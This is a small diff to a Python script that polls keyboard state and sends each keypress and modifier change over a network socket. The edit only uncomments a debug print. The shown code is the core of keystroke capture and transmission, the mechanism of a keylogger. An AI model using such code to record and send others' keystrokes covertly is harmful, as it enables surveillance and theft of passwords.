@@ -135,7 +135,6 @@ def fetch_keys_raw():
     return keyboard
 
 
-
 def fetch_keys():
     global caps_lock_state, last_pressed, last_pressed_adjusted, last_modifier_state
     keypresses_raw = fetch_keys_raw()
@@ -204,7 +203,7 @@ def log(sleep_interval=.001):
         changed, modifiers, keys = fetch_keys()
         if changed:
             mess2send='key,%r %r'%(keys,modifiers)
-#             print(mess2send)
+            print(mess2send)
             s.send(mess2send)
     s.close()
 
